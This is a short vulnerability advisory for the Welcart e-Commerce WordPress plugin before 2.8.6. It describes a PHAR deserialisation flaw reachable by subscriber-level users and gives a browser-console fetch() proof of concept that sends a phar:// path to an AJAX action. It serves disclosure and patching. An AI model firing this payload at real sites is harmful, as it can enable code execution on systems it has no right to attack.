## WordPress Plugin Vulnerabilities

# Welcart e-Commerce < 2.8.6 - Subscriber+ PHAR Deserialisation

### Description

The plugin does not validate user input before using it in file\_exist() functions via various AJAX actions available to any authenticated users, which could allow users with a role as low as subscriber to perform PHAR deserialisation when they can upload a file and a suitable gadget chain is present on the blog

### Proof of Concept

Run the below command in the developer console of the web browser while being on the blog as subscriber user
fetch("/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"method": "POST",
"body": 'action=wel\_check\_progress\_ajax&progressfile=phar://path-to-uploaded-phar.phar/log.txt',
"credentials": "include"
}).then(response => response.text())
.then(data => console.log(data));
